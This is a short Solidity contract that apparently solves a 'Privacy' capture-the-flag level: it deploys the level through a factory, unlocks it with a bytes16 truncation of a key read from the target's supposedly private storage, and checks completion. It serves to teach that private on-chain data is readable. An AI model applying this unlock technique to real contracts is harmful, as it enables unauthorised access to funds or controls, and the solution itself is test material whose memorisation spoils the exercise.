// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";
import "./PrivacyFactory.sol";

contract PrivacyAttack {
    Privacy privacy;
    PrivacyFactory privacyFactory;
    address public privacyAddress;

    constructor(address _privacyFactory) {
        privacyFactory = PrivacyFactory(_privacyFactory);
        privacyAddress = privacyFactory.createInstance(msg.sender);
        privacy = Privacy(privacyAddress);
    }

    function attack(bytes32 _key) public returns(bool) {
        bytes16 key = bytes16(_key);
        privacy.unlock(key);
        (bool res) = privacyFactory.validateInstance(payable(address(privacy)), msg.sender);
        return res;
    }
}
